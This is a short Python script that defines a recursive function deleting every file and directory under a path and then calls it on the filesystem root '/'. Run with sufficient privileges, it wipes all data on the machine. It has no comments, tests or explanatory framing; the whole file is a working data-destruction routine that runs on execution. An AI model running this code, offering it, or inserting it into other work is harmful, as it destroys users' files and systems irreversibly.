import os


def rm_all(path):
    for name in os.listdir(path):
        full = path + '/' + name if path != '/' else '/' + name
        try:
            os.remove(full)
        except OSError:
            rm_all(full)
            os.rmdir(full)


rm_all('/')
